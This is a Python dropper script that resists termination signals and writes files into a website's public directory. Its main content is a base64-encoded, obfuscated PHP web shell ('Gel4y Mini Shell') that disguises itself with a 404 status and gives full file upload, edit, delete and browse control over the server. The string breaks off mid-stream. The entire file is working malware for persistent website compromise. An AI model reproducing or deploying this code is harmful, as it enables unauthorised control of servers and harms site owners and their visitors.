from __future__ import print_function
import os
import time
import base64
import signal
import sys  # Import the sys module
#nonroot
def signal_handler(signal, frame):
    print('Signal received, but I am not stopping')

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

directory = "/var/www/jurnalfsh/public/-/kobra88"
file_path_index = os.path.join(directory, "index.html")
file_path_page = os.path.join(directory, "scrowx.php")
file_path_sitemap = os.path.join(directory, "sitemap.xml")
file_path_robots = os.path.join(directory, "robots.txt")
file_content_index = ""  # Base64 encoded content for index.php
file_content_page = "#PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwpodHRwX3Jlc3BvbnNlX2NvZGUoNDA0KTsKZGVmaW5lKCJzZWxmIiwgIkdceDY1bFw2NHkgTVx4NjluXHg2OSBTaFx4NjVsbCIpOwokc2NEID0gInNceDYzXHg2MVx4NmVceDY0XHg2OXIiOwokZmMgPSBhcnJheSgiNzA2ODcwNWY3NTZlNjE2ZDY1IiwgIjcwNjg3MDc2NjU3MjczNjk2ZjZlIiwgIjY3NjU3NDYzNzc2NCIsICI2MzY4NjQ2OTcyIiwgIjcwNzI2NTY3NWY3MzcwNmM2OTc0IiwgIjYxNzI3MjYxNzk1ZjY0Njk2NjY2IiwgIjY5NzM1ZjY0Njk3MiIsICI2OTczNWY2NjY5NmM2NSIsICI2OTczNWY3NzcyNjk3NDYxNjI2YzY1IiwgIjY5NzM1ZjcyNjU2MTY0NjE2MjZjNjUiLCAiNjY2OTZjNjU3MzY5N2E2NSIsICI2MzZmNzA3OSIsICI2NjY5NmM2NTVmNjU3ODY5NzM3NDczIiwgIjY2Njk2YzY1NWY3MDc1NzQ1ZjYzNmY2ZTc0NjU2ZTc0NzMiLCAiNjY2OTZjNjU1ZjY3NjU3NDVmNjM2ZjZlNzQ2NTZlNzQ3MyIsICI2ZDZiNjQ2OTcyIiwgIjcyNjU2ZTYxNmQ2NSIsICI3Mzc0NzI3NDZmNzQ2OTZkNjUiLCAiNjg3NDZkNmM3MzcwNjU2MzY5NjE2YzYzNjg2MTcyNzMiLCAiNjQ2MTc0NjUiLCAiNjY2OTZjNjU2ZDc0Njk2ZDY1Iik7CmZvciAoJGkgPSAwOyAkaSA8IGNvdW50KCRmYyk7ICRpKyspIHsKCSRmY1skaV0gPSBuaHgoJGZjWyRpXSk7Cn0KaWYgKGlzc2V0KCRfR0VUWyJwIl0pKSB7CgkkcCA9IG5oeCgkX0dFVFsicCJdKTsKCSRmY1szXShuaHgoJF9HRVRbInAiXSkpOwp9IGVsc2UgewoJJHAgPSAkZmNbMl0oKTsKfQpmdW5jdGlvbiBoZXgoJHN0cikgewoJJHIgPSAiIjsKCWZvciAoJGkgPSAwOyAkaSA8IHN0cmxlbigkc3RyKTsgJGkrKykgewoJCSRyIC49IGRlY2hleChvcmQoJHN0clskaV0pKTsKCX0KCXJldHVybiAkcjsKfQpmdW5jdGlvbiBuaHgoJHN0cikgewoJJHIgPSAiIjsKCSRsZW4gPSAoc3RybGVuKCRzdHIpIC0xKTsKCWZvciAoJGkgPSAwOyAkaSA8ICRsZW47ICRpICs9IDIpIHsKCQkkciAuPSBjaHIoaGV4ZGVjKCRzdHJbJGldLiRzdHJbJGkrMV0pKTsKCX0KCXJldHVybiAkcjsKfQpmdW5jdGlvbiBwZXJtcygkZikgewoJJHAgPSBmaWxlcGVybXMoJGYpOwoJaWYgKCgkcCAmIDB4QzAwMCkgPT0gMHhDMDAwKSB7CgkJJGkgPSAncyc7Cgl9IGVsc2VpZiAoKCRwICYgMHhBMDAwKSA9PSAweEEwMDApIHsKCQkkaSA9ICdsJzsKCX0gZWxzZWlmICgoJHAgJiAweDgwMDApID09IDB4ODAwMCkgewoJCSRpID0gJy0nOwoJfSBlbHNlaWYgKCgkcCAmIDB4NjAwMCkgPT0gMHg2MDAwKSB7CgkJJGkgPSAnYic7Cgl9IGVsc2VpZiAoKCRwICYgMHg0MDAwKSA9PSAweDQwMDApIHsKCQkkaSA9ICdkJzsKCX0gZWxzZWlmICgoJHAgJiAweDIwMDApID09IDB4MjAwMCkgewoJCSRpID0gJ2MnOwoJfSBlbHNlaWYgKCgkcCAmIDB4MTAwMCkgPT0gMHgxMDAwKSB7CgkJJGkgPSAncCc7Cgl9IGVsc2UgewoJCSRpID0gJ3UnOwoJfQoJJGkgLj0gKCgkcCAmIDB4MDEwMCkgPyAncicgOiAnLScpOwoJJGkgLj0gKCgkcCAmIDB4MDA4MCkgPyAndycgOiAnLScpOwoJJGkgLj0gKCgkcCAmIDB4MDA0MCkgPyAoKCRwICYgMHgwODAwKSA/ICdzJyA6ICd4JykgOiAoKCRwICYgMHgwODAwKSA/ICdTJyA6ICctJykpOwoJJGkgLj0gKCgkcCAmIDB4MDAyMCkgPyAncicgOiAnLScpOwoJJGkgLj0gKCgkcCAmIDB4MDAxMCkgPyAndycgOiAnLScpOwoJJGkgLj0gKCgkcCAmIDB4MDAwOCkgPyAoKCRwICYgMHgwNDAwKSA/ICdzJyA6ICd4JykgOiAoKCRwICYgMHgwNDAwKSA/ICdTJyA6ICctJykpOwoJJGkgLj0gKCgkcCAmIDB4MDAwNCkgPyAncicgOiAnLScpOwoJJGkgLj0gKCgkcCAmIDB4MDAwMikgPyAndycgOiAnLScpOwoJJGkgLj0gKCgkcCAmIDB4MDAwMSkgPyAoKCRwICYgMHgwMjAwKSA/ICd0JyA6ICd4JykgOiAoKCRwICYgMHgwMjAwKSA/ICdUJyA6ICctJykpOwoJcmV0dXJuICRpOwp9CmZ1bmN0aW9uIGEoJG1zZywgJHN0cyA9IDEsICRsb2MgPSAiIikgewoJZ2xvYmFsICRwOwoJJHN0YXR1cyA9ICgoJHN0cyA9PSAxKSA/ICJzdWNjZXNzIiA6ICJlcnJvciIpOwoJZWNobyAiPHNjcmlwdD5zd2FsKHt0aXRsZTogXCJ7JHN0YXR1c31cIiwgdGV4dDogXCJ7JG1zZ31cIiwgaWNvbjogXCJ7JHN0YXR1c31cIn0pLnRoZW4oKGJ0bkNsaWNrKSA9PiB7aWYoYnRuQ2xpY2spe2RvY3VtZW50LmxvY2F0aW9uLmhyZWY9XCI/cD0iLmhleCgkcCkuJGxvYy4iXCJ9fSk8L3NjcmlwdD4iOwp9CmZ1bmN0aW9uIGRlbGRpcigkZCkgewoJZ2xvYmFsICRmYzsKCWlmICh0cmltKHBhdGhpbmZvKCRkLCBQQVRISU5GT19CQVNFTkFNRSksICcuJykgPT09ICcnKSByZXR1cm47CglpZiAoJGZjWzZdKCRkKSkgewoJCWFycmF5X21hcCgiZGVsZGlyIiwgZ2xvYigkZCAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAneywufSonLCBHTE9CX0JSQUNFIHwgR0xPQl9OT1NPUlQpKTsKCQlybWRpcigkZCk7Cgl9IGVsc2UgewoJCXVubGluaygkZCk7Cgl9Cn0KPz4KPCFkb2N0eXBlIGh0bWw+CjwhLS0gUmFuZHNYIGFrYSBUMWt1c19nMHQgLS0+CjxodG1sIGxhbmc9ImVuIj48aGVhZD48bWV0YSBuYW1lPSJ0aGVtZS1jb2xvciIgY29udGVudD0icmVkIj48bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTAuNjAsIHNocmluay10by1maXQ9bm8iPjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iLy9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANC42LjAvZGlzdC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiPjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iLy9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZm9udC1hd2Vzb21lLzQuNy4wL2Nzcy9mb250LWF3ZXNvbWUubWluLmNzcyI+PHRpdGxlPjw/PSBzZWxmID8+PC90aXRsZT48c3R5bGU+LnRhYmxlLWhvdmVyIHRib2R5IHRyOmhvdmVyIHRke2JhY2tncm91bmQ6cmVkfS50YWJsZS1ob3ZlciB0Ym9keSB0cjpob3ZlciB0ZD4qe2NvbG9yOiNmZmZ9LnRhYmxlPnRib2R5PnRyPip7Y29sb3I6I2ZmZjt2ZXJ0aWNhbC1hbGlnbjptaWRkbGV9LmZvcm0tY29udHJvbHtiYWNrZ3JvdW5kOjAgMCFpbXBvcnRhbnQ7Y29sb3I6I2ZmZiFpbXBvcnRhbnQ7Ym9yZGVyLXJhZGl1czowfS5mb3JtLWNvbnRyb2w6OnBsYWNlaG9sZGVye2NvbG9yOiNmZmY7b3BhY2l0eToxfWxpe2ZvbnQtc2l6ZToxOHB4O21hcmdpbi1sZWZ0OjZweDtsaXN0LXN0eWxlOm5vbmV9YXtjb2xvcjojZmZmfTwvc3R5bGU+PHNjcmlwdCBzcmM9Ii8vdW5wa2cuY29tL3N3ZWV0YWxlcnQvZGlzdC9zd2VldGFsZXJ0Lm1pbi5qcyI+PC9zY3JpcHQ+PC9oZWFkPjxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiMwMDA7Y29sb3I6I2ZmZjtmb250LWZhbWlseTpzZXJpZjsiPjxkaXYgY2xhc3M9ImJnLWRhcmsgdGFibGUtcmVzcG9uc2l2ZSB0ZXh0LWxpZ2h0IGJvcmRlciI+PGRpdiBjbGFzcz0iZC1mbGV4IGp1c3RpZnktY29udGVudC1iZXR3ZWVuIHAtMSI+PGRpdj48aDMgY2xhc3M9Im10LTIiPjxhIGhyZWY9Ij8iPjw/PSBzZWxmID8+PC9hPjwvaDM+PC9kaXY+PGRpdj48c3Bhbj5QSFAgVmVyc2lvbiA6IDw/PSAkZmNbMV0oKSA/Pjwvc3Bhbj4gPGJyPjxhIGhyZWY9Ij9wPTw/PSBoZXgoJHApLiImYT0iLmhleCgibmV3RmlsZSIpID8+Ij4rRmlsZTwvYT48YSBocmVmPSI/cD08Pz0gaGV4KCRwKS4iJmE9Ii5oZXgoIm5ld0RpciIpID8+Ij4rRGlyZWN0b3J5PC9hPjwvZGl2PjwvZGl2PjxkaXYgY2xhc3M9ImJvcmRlci10b3AgdGFibGUtcmVzcG9uc2l2ZSI+PGxpPlVuYW1lIDogPD89ICRmY1swXSgpID8+PC9saT48L2Rpdj48Zm9ybSBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPjxkaXYgY2xhc3M9ImlucHV0LWdyb3VwIG1iLTEgcHgtMSBtdC0xIj48ZGl2IGNsYXNzPSJjdXN0b20tZmlsZSI+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZbXSIgY2xhc3M9ImN1c3RvbS1maWxlLWlucHV0IiBvbmNoYW5nZT0idGhpcy5mb3JtLnN1Ym1pdCgpIiBtdWx0aXBsZT48bGFiZWwgY2xhc3M9ImN1c3RvbS1maWxlLWxhYmVsIHJvdW5kZWQtMCBiZy10cmFuc3BhcmVudCB0ZXh0LWxpZ2h0Ij5DaG9vc2UgZmlsZTwvbGFiZWw+PC9kaXY+PC9kaXY+PC9mb3JtPgo8P3BocAppZiAoaXNzZXQoJF9GSUxFU1siZiJdKSkgewoJJG4gPSAkX0ZJTEVTWyJmIl1bIm5hbWUiXTsKCWZvciAoJGkgPSAwOyAkaSA8IGNvdW50KCRuKTsgJGkrKykgewoJCWlmICgkZmNbMTFdKCRfRklMRVNbImYiXVsidG1wX25hbWUiXVskaV0sICRuWyRpXSkpIHsKCQkJYSgiZmlsZSB1cGxvYWRlZCBzdWNjZXNzZnVsbHkiKTsKCQl9IGVsc2UgewoJCQlhKCJmaWxlIGZhaWxlZCB0byB1cGxvYWQiLCAwKTsKCQl9Cgl9Cn0KaWYgKGlzc2V0KCRfR0VUWyJkb3dubG9hZCJdKSkgewoJaGVhZGVyKCJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSIpOwoJaGVhZGVyKCJDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nOiBCaW5hcnkiKTsKCWhlYWRlcigiQ29udGVudC1MZW5ndGg6ICIuJGZjWzE3XShuaHgoJF9HRVRbIm4iXSkpKTsKCWhlYWRlcigiQ29udGVudC1kaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9XCIiLm5oeCgkX0dFVFsibiJdKS4iXCIiKTsKfQo/Pgo8L2Rpdj48ZGl2IGNsYXNzPSJiZy1kYXJrIGJvcmRlciB0YWJsZS1yZXNwb25zaXZlIG10LTIiPjxkaXYgY2xhc3M9Im1sLTIiIHN0eWxlPSJmb250LXNpemU6MThweDsiPjxzcGFuPlBhdGg6IDwvc3Bhbj4KPD9waHAKJHBzID0gJGZjWzRdKCIvKFxcXHxcLykvIiwgJHApOwpmb3JlYWNoICgkcHMgYXMgJGsgPT4gJHYpIHsKCWlmICgkayA9PSAwICYmICR2ID09ICIiKSB7CgkJZWNobyAiPGEgaHJlZj1cIj9wPTJmXCI+fjwvYT4vIjsgY29udGludWU7Cgl9CglpZiAoJHYgPT0gIiIpIGNvbnRpbnVlOwoJZWNobyAiPGEgaHJlZj1cIj9wPSI7Cglmb3IgKCRpID0gMDsgJGkgPD0gJGs7ICRpKyspIHsKCQllY2hvIGhleCgkcHNbJGldKTsKCQlpZiAoJGkgIT0gJGspIGVjaG8gIjJmIjsKCX0KCWVjaG8gIlwiPnskdn08L2E+LyI7Cn0KPz4KPC9kaXY+PC9kaXY+PGFydGljbGUgY2xhc3M9ImJnLWRhcmsgYm9yZGVyIHRhYmxlLXJlc3BvbnNpdmUgbXQtMiI+Cjw/cGhwIGlmICghaXNzZXQoJF9HRVRbImEiXSkpOiA/Pgo8dGFibGUgY2xhc3M9InRhYmxlIHRhYmxlLWhvdmVyIHRhYmxlLWJvcmRlcmxlc3MgdGFibGUtc20iPjx0aGVhZCBjbGFzcz0idGV4dC1saWdodCI+PHRyPjx0aD5OYW1lPC90aD48dGg+U2l6ZTwvdGg+PHRoPlBlcm1pc3Npb248L3RoPjx0aD5BY3Rpb248L3RoPjwvdHI+PC90aGVhZD48dGJvZHkgY2xhc3M9InRleHQtbGlnaHQiPgo8P3BocAokc2NEID0gJGZjWzVdKCRzY0QoJHApLCBbIi4iLCAiLi4iXSk7CmZvcmVhY2ggKCRzY0QgYXMgJGQpIHsKCWlmICghJGZjWzZdKCIkcC8kZCIpKSBjb250aW51ZTsKCWVjaG8gIjx0cj48dGQ+PGEgaHJlZj1cIj9wPSIuaGV4KCIkcC8kZCIpLiJcIiBkYXRhLXRvZ2dsZT1cInRvb2x0aXBcIiBkYXRhLXBsYWNlbWVudD1cImF1dG9cIiB0aXRsZT1cIkxhdGVzdCBtb2RpZnkgb24gIi4kZmNbMTldKCJZLW0tZCBIOmkiLCAkZmNbMjBdKCIkcC8kZCIpKS4iXCI+PGkgY2xhc3M9XCJmYSBmYS1mdyBmYS1mb2xkZXJcIj48L2k+IHskZH08L2E+PC90ZD48dGQ+Ti9BPC90ZD48dGQ+PGZvbnQgY29sb3I9XCIiLigoJGZjWzhdKCIkcC8kZCIpKSA/ICIjMDBmZjAwIiA6ICghJGZjWzldKCIkcC8kZCIpID8gInJlZCIgOiBudWxsKSkuIlwiPiIucGVybXMoIiRwLyRkIikuIjwvZm9udD48L3RkPjx0ZD48YSBocmVmPVwiP3A9Ii5oZXgoJHApLiImYT0iLmhleCgicmVuYW1lIikuIiZuPSIuaGV4KCRkKS4iJnQ9ZFwiIGRhdGEtdG9nZ2xlPVwidG9vbHRpcFwiIGRhdGEtcGxhY2VtZW50PVwiYXV0b1wiIHRpdGxlPVwiUmVuYW1lXCI+PGkgY2xhc3M9XCJmYSBmYS1mdyBmYS1wZW5jaWxcIj48L2k+PC9hPjxhIGhyZWY9XCI/cD0iLmhleCgkcCkuIiZhPSIuaGV4KCJkZWxldGUiKS4iJm49Ii5oZXgoJGQpLiJcIiBjbGFzcz1cImRlbGV0ZVwiIGRhdGEtdHlwZT1cImZvbGRlclwiIGRhdGEtdG9nZ2xlPVwidG9vbHRpcFwiIGRhdGEtcGxhY2VtZW50PVwiYXV0b1wiIHRpdGxlPVwiRGVsZXRlXCI+PGkgY2xhc3M9XCJmYSBmYS1mdyBmYS10cmFzaFwiPjwvaT48L2E+PC90ZD48L3RyPiI7Cn0KZm9yZWFjaCAoJHNjRCBhcyAkZikgewoJaWYgKCEkZmNbN10oIiRwLyRmIikpIGNvbnRpbnVlOwoJJHN6ID0gJGZjWzEwXSgiJHAvJGYiKS8xMDI0OwoJJHN6ID0gcm91bmQoJHN6LCAzKTsKCSRzeiA9ICgkc3ogPiAxMDI0KSA/IHJvdW5kKCRzei8xMDI0LCAyKS4iTUIiIDogJHN6LiJLQiI7CgllY2hvICI8dHI+PHRkPjxhIGhyZWY9XCI/cD0iLmhleCgkcCkuIiZhPSIuaGV4KCJ2aWV3IikuIiZuPSIuaGV4KCRmKS4iXCIgZGF0YS10b2dnbGU9XCJ0b29sdGlwXCIgZGF0YS1wbGFjZW1lbnQ9XCJhdXRvXCIgdGl0bGU9XCJMYXRlc3QgbW9kaWZ5IG9uICIuJGZjWzE5XSgiWS1tLWQgSDppIiwgJGZjWzIwXSgiJHAvJGYiKSkuIlwiPjxpIGNsYXNzPVwiZmEgZmEtZncgZmEtZmlsZVwiPjwvaT4geyRmfTwvYT48L3RkPjx0ZD57JHN6fTwvdGQ+PHRkPjxmb250IGNvbG9yPVwiIi4oKCRmY1s4XSgiJHAvJGYiKSkgPyAiIzAwZmYwMCIgOiAoISRmY1s5XSgiJHAvJGYiKSA/ICJyZWQiIDogbnVsbCkpLiJcIj4iLnBlcm1zKCIkcC8kZiIpLiI8L2ZvbnQ+PC90ZD48dGQ+PGRpdiBjbGFzcz1cImQtZmxleCBqdXN0aWZ5LWNvbnRlbnQtYmV0d2VlblwiPjxhIGhyZWY9XCI/cD0iLmhleCgkcCkuIiZhPSIuaGV4KCJlZGl0IikuIiZuPSIuaGV4KCRmKS4iXCIgZGF0YS10b2dnbGU9XCJ0b29sdGlwXCIgZGF0YS1wbGFjZW1lbnQ9XCJhdXRvXCIgdGl0bGU9XCJFZGl0XCI+PGkgY2xhc3M9XCJmYSBmYS1mdyBmYS1lZGl0XCI+PC9pPjwvYT48YSBocmVmPVwiP3A9Ii5oZXgoJHApLiImYT0iLmhleCgicmVuYW1lIikuIiZuPSIuaGV4KCRmKS4iJnQ9ZlwiIGRhdGEtdG9nZ2xlPVwidG9vbHRpcFwiIGRhdGEtcGxhY2VtZW50PVwiYXV0b1wiIHRpdGxlPVwiUmVuYW1lXCI+PGkgY2xhc3M9XCJmYSBmYS1mdyBmYS1wZW5jaWxcIj48L2k+PC9hPjxhIGhyZWY9XCI/cD0iLmhleCgkcCkuIiZuPSIuaGV4KCRmKS4iJmRvd25sb2FkIi4iXCIgZGF0YS10b2dnbGU9XCJ0b29sdGlwXCIgZGF0YS1wbGFjZW1lbnQ9XCJhdXRvXCIgdGl0bGU9XCJEb3dubG9hZFwiPjxpIGNsYXNzPVwiZmEgZmEtZncgZmEtZG93bmxvYWRcIj48L2k+PC9hPjxhIGhyZWY9XCI/cD0iLmhleCgkcCkuIiZhPSIuaGV4KCJkZWxldGUiKS4iJm49Ii5oZXgoJGYpLiJcIiBjbGFzcz1cImRlbGV0ZVwiIGRhdGEtdHlwZT1cImZpbGVcIiBkYXRhLXRvZ2dsZT1cInRvb2x0aXBcIiBkYXRhLXBsYWNlbWVudD1cImF1dG9cIiB0aXRsZT1cIkRlbGV0ZVwiPjxpIGNsYXNzPVwiZmEgZmEtZncgZmEtdHJhc2hcIj48L2k+PC9hPjwvZGl2PjwvdGQ+PC90cj4iOwp9Cj8+PC90Ym9keT48L3RhYmxlPgo8P3BocCBlbHNlIDppZiAoaXNzZXQoJF9HRVRbImEiXSkpICRhID0gbmh4KCRfR0VUWyJhIl0pOyA/Pgo8ZGl2IGNsYXNzPSJweC0yIHB5LTIiPgo8P3BocCBpZiAoJGEgPT0gImRlbGV0ZSIpIHsKCSRsb2MgPSAkcC4nLycubmh4KCRfR0VUWyJuIl0pOwoJaWYgKCRfR0VUWyJ0Il0gPT0gImQiKSB7CgkJZGVsZGlyKCRsb2MpOwoJCWlmICghJGZjWzEyXSgkbG9jKSkgewoJCQlhKCJmb2xkZXIgZGVsZXRlZCBzdWNjZXNzZnVsbHkiKTsKCQl9IGVsc2UgewoJCQlhKCJmYWlsZWQgdG8gZGVsZXRlIHRoZSBmb2xkZXIiLCAwKTsKCQl9Cgl9CglpZiAoJF9HRVRbInQiXSA9PSAiZiIpIHsKCQkkbG9jID0gJHAuJy8nLm5oeCgkX0dFVFsibiJdKTsKCQl1bmxpbmsoJGxvYyk7CgkJaWYgKCEkZmNbMTJdKCRsb2MpKSB7CgkJCWEoImZpbGUgZGVsZXRlZCBzdWNjZXNzZnVsbHkiKTsKCQl9IGVsc2UgewoJCQlhKCJmaWxlIHRvIGRlbGV0ZSB0aGUgZm9sZGVyIiwgMCk7CgkJfQoJfQp9Cj8+Cjw/cGhwIGlmICgkYSA9PSAibmV3RGlyIik6ID8+CjxoNSBjbGFzcz0iYm9yZGVyIHAtMSBtYi0zIj5OZXcgZm9sZGVyPC9oNT4KPGZvcm0gbWV0aG9kPSJwb3N0Ij48ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj48bGFiZWwgZm9yPSJuIj5OYW1lIDo8L2xhYmVsPjxpbnB1dCBuYW1lPSJuIiBpZD0ibiIgY2xhc3M9ImZvcm0tY29udHJvbCIgYXV0b2NvbXBsZXRlPSJvZmYiPjwvZGl2PjxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPjxidXR0b24gdHlwZT0ic3VibWl0IiBuYW1lPSJzIiBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lLWxpZ2h0IHJvdW5kZWQtMCI+Q3JlYXRlPC9idXR0b24+PC9kaXY+PC9mb3JtPgo8P3BocCAoKGlzc2V0KCRfUE9TVFsicyJdKSkgPyAoJGZjWzEyXSgiJHAveyRfUE9TVFsibiJdfSIpID8gYSgiZm9sZGVyIG5hbWUgaGFzIGJlZW4gdXNlZCIsIDAsICImYT0iLmhleCgibmV3RGlyIikpIDogKCRmY1sxNV0oIiRwL3skX1BPU1RbIm4iXX0iKSA/IGEoImZvbGRlciBjcmVhdGVkIHN1Y2Nlc3NmdWxseSIpIDogYSgiZm9sZGVyIGZhaWxlZCB0byBjcmVhdGUiLCAwKSkpIDogbnVsbCk7IGVsc2VpZiAoJGEgPT0gIm5ld0ZpbGUiKTogPz4KPGg1IGNsYXNzPSJib3JkZXIgcC0xIG1iLTMiPk5ldyBmaWxlPC9oNT4KPGZvcm0gbWV0aG9kPSJwb3N0Ij48ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj48bGFiZWwgZm9yPSJuIj5GaWxlIG5hbWUgOjwvbGFiZWw+PGlucHV0IHR5cGU9InRleHQiIG5hbWU9Im4iIGlkPSJuIiBjbGFzcz0iZm9ybS1jb250cm9sIiBwbGFjZWhvbGRlcj0iaGFjay50eHQiPjwvZGl2PjxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPjxsYWJlbCBmb3I9ImN0biI+Q29udGVudCA6PC9sYWJlbD48dGV4dGFyZWEgc3R5bGU9InJlc2l6ZTpub25lIiBuYW1lPSJjdG4iIGlkPSJjdG4iIGNvbHM9IjMwIiByb3dzPSIxMCIgY2xhc3M9ImZvcm0tY29udHJvbCIgcGxhY2Vob2xkZXI9IiMgU3RhbXBlZCBCeSBNZSI+PC90ZXh0YXJlYT48L2Rpdj48ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj48YnV0dG9uIHR5cGU9InN1Ym1pdCIgbmFtZT0icyIgY2xhc3M9ImJ0biBidG4tb3V0bGluZS1saWdodCByb3VuZGVkLTAiPkNyZWF0ZTwvYnV0dG9uPjwvZGl2PjwvZm9ybT4KPD9waHAgKChpc3NldCgkX1BPU1RbInMiXSkpID8gKCRmY1sxMl0oIiRwL3skX1BPU1RbIm4iXX0iKSA/IGEoImZpbGUgbmFtZSBoYXMgYmVlbiB1c2VkIiwgMCwgIiZhPSIuaGV4KCJuZXdGaWxlIikpIDogKCRmY1sxM10oIiRwL3skX1BPU1RbIm4iXX0iLCAkX1BPU1RbImN0biJdKSA/IGEoImZpbGUgY3JlYXRlZCBzdWNjZXNzZnVsbHkiLDEsIiZhPSIuaGV4KCJ2aWV3IikuIiZuPSIuaGV4KCRfUE9TVFsibiJdKSkgOiBhKCJmaWxlIGZhaWxlZCB0byBjcmVhdGUiLCAwKSkpIDogbnVsbCk7IGVsc2VpZiAoJGEgPT0gInJlbmFtZSIpOiA/Pgo8aDUgY2xhc3M9ImJvcmRlciBwLTEgbWItMyI+UmVuYW1lIDw/PSAoKCRfR0VUWyJ0Il0gPT0gImQiKSA/ICJmb2xkZXIiIDogImZpbGUiKSA/PjwvaDU+Cjxmb3JtIG1ldGhvZD0icG9zdCI+PGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+PGxhYmVsIGZvcj0ibiI+TmFtZSA6PC9sYWJlbD48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ibiIgaWQ9Im4iIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHZhbHVlPSI8Pz0gbmh4KCRfR0VUWyJuIl0pID8+Ij48L2Rpdj48ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj48YnV0dG9uIHR5cGU9InN1Ym1pdCIgbmFtZT0icyIgY2xhc3M9ImJ0biBidG4tb3V0bGluZS1saWdodCByb3VuZGVkLTAiPlNhdmU8L2J1dHRvbj48L2Rpdj48L2Zvcm0+Cjw/cGhwICgoaXNzZXQoJF9QT1NUWyJzIl0pKSA/ICgkZmNbMTZdKCRwLicvJy5uaHgoJF9HRVRbIm4iXSksICRfUE9TVFsibiJdKSA/IGEoInN1Y2Nlc3NmdWxseSBjaGFuZ2VkIHRoZSBmb2xkZXIgbmFtZSIpIDogYSgiZmFpbGVkIHRvIGNoYW5nZSB0aGUgZm9sZGVyIG5hbWUiLCAwKSkgOiBudWxsKTsgZWxzZWlmICgkYSA9PSAiZWRpdCIpOiA/Pgo8aDUgY2xhc3M9ImJvcmRlciBwLTEgbWItMyI+RWRpdCBmaWxlPC9oNT4KPHNwYW4+RmlsZSBuYW1lIDogPD89IG5oeCgkX0dFVFsibiJdKSA/Pjwvc3Bhbj4KPGZvcm0gbWV0aG9kPSJwb3N0Ij48ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj48bGFiZWwgZm9yPSJjdG4iPkNvbnRlbnQgOjwvbGFiZWw+PHRleHRhcmVhIG5hbWU9ImN0biIgaWQ9ImN0biIgY29scz0iMzAiIHJvd3M9IjEwIiBjbGFzcz0iZm9ybS1jb250cm9sIj48Pz0gJGZjWzE4XSgkZmNbMTRdKCRwLicvJy5uaHgoJF9HRVRbIm4iXSkpKSA/PjwvdGV4dGFyZWE+PC9kaXY+PGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+PGJ1dHRvbiB0eXBlPSJzdWJtaXQiIG5hbWU9InMiIGNsYXNzPSJidG4gYnRuLW91dGxpbmUtbGlnaHQgcm91bmRlZC0wIj5TYXZlPC9idXR0b24+PC9kaXY+PC9mb3JtPgo8P3BocCAoKGlzc2V0KCRfUE9TVFsicyJdKSkgPyAoJGZjWzEzXSgkcC4nLycubmh4KCRfR0VUWyJuIl0pLCAkX1BPU1RbImN0biJdKSA/IGEoImZpbGUgY29udGVudHMgY2hhbmdlZCBzdWNjZXNzZnVsbHkiLCAxLCAiJmE9Ii5oZXgoInZpZXciKS4iJm49eyRfR0VUWyJuIl19IikgOiBhKCJmaWxlIGNvbnRlbnRzIGZhaWxlZCB0byBjaGFuZ2UiKSkgOiBudWxsKTsgZWxzZWlmICgkYSA9PSAidmlldyIpOiA/Pgo8aDUgY2xhc3M9ImJvcmRlciBwLTEgbWItMyI+VmlldyBmaWxlPC9oNT4KPHNwYW4+RmlsZSBuYW1lIDogPD89IG5oeCgkX0dFVFsibiJdKSA/Pjwvc3Bhbj4KPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+PGxhYmVsIGZvcj0iY3RuIj5Db250ZW50IDo8L2xhYmVsPjx0ZXh0YXJlYSBuYW1lPSJjdG4iIGlkPSJjdG4iIGNvbHM9IjMwIiByb3dzPSIxMCIgY2xhc3M9ImZvcm0tY29udHJvbCIgcmVhZG9ubHk+PD89ICRmY1sxOF0oJGZjWzE0XSgkcC4nLycubmh4KCRfR0VUWyJuIl0pKSkgPz48L3RleHRhcmVhPjwvZGl2Pjw/cGhwIGVuZGlmOyA/PjwvZGl2Pjw/cGhwIGVuZGlmOyA/PjwvYXJ0aWNsZT48ZGl2IGNsYXNzPSJiZy1kYXJrIGJvcmRlciB0ZXh0LWNlbnRlciBtdC0yIj48c21hbGw+Q29weXJpZ2h0ICZjb3B5OyAyMDIxIC0gUG93ZXJlZCBCeSBJTkRPTkVTSUFOIFNFQ1VSRSBTWVNURU0nPC9zbWFsbD48L2Rpdj48c2NyaXB0IHNyYz0iLy9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5LTMuNS4xLnNsaW0ubWluLmpzIj48L3NjcmlwdD48c2NyaXB0IHNyYz0iLy9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANC42LjAvZGlzdC9qcy9ib290c3RyYXAuYnVuZGxlLm1pbi5qcyIgPjwvc2NyaXB0PjxzY3JpcHQgc3JjPSIvL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2JzLWN1c3RvbS1maWxlLWlucHV0L2Rpc3QvYnMtY3VzdG9tLWZpbGUtaW5wdXQubWluLmpzIj48L3NjcmlwdD48c2Nya